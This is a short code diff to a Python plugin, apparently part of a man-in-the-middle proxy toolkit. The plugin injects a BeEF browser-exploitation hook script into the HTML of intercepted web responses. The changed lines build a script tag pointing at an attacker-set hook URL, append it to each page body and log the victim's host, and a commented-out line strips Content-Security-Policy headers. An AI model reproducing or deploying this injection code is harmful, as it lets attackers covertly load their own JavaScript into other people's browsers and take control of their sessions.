@@ -25,9 +25,9 @@ Copyright:
 class beef(PluginTemplate):
     meta = {
         'Name'      : 'beef',
-        'Version'   : '1.0',
+        'Version'   : '1.1',
         'Description' : 'this module proxy inject hook beef api url.[Hook URL]',
-        'Author'    : 'Pumpkin Dev'
+        'Author'    : 'by Maintainer'
     }
     def __init__(self):
         for key,value in self.meta.items():
@@ -47,9 +47,10 @@ class beef(PluginTemplate):
                 del flow.response.headers["Content-Security-Policy"]
             """
             if html.body:
-                script = html.new_tag(
-                    'script',
-                    src=self.urlhook)
-                html.body.insert(0, script)
+                url =  '{}'.format(flow.request.pretty_host)
+                metatag = html.new_tag('script')
+                metatag.attrs['src'] = self.urlhook
+                metatag.attrs['type'] = 'text/javascript'
+                html.body.append(metatag)
                 flow.response.content = str(html)
-                self.send_output.emit("[{}] Injected BeFF url hook...".format(self.Name))
+                self.send_output.emit("[{}] Injected BeFF hook in URL:[ {} ] ".format(self.Name,url))
